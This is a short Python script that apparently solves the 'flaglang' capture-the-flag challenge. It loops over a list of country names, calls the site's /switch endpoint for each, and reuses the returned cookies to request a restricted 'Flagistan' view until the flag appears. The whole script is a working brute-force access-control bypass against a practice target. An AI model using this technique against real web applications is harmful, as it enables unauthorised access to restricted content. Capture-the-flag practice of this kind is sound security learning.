import requests

url = "https://flaglang.chall.lac.tf"

with open("countries.txt", "r") as countries:
    for country in countries:
    
        #switching to country, [:-1] to get rid of "\n"
        print(url + "/switch?to=" + country[:-1])
        response = requests.get(url + "/switch?to=" + country[:-1])

        #if successful view as flagistan
        if(response.status_code == 200):
            print(url + "/view?country=Flagistan")
            #cookies are needed to know what country we are viewing as
            view_flagistan = requests.get(url + "/view?country=Flagistan", cookies=response.cookies)
            if "lactf" in view_flagistan.text:
                print(view_flagistan.text)
                exit()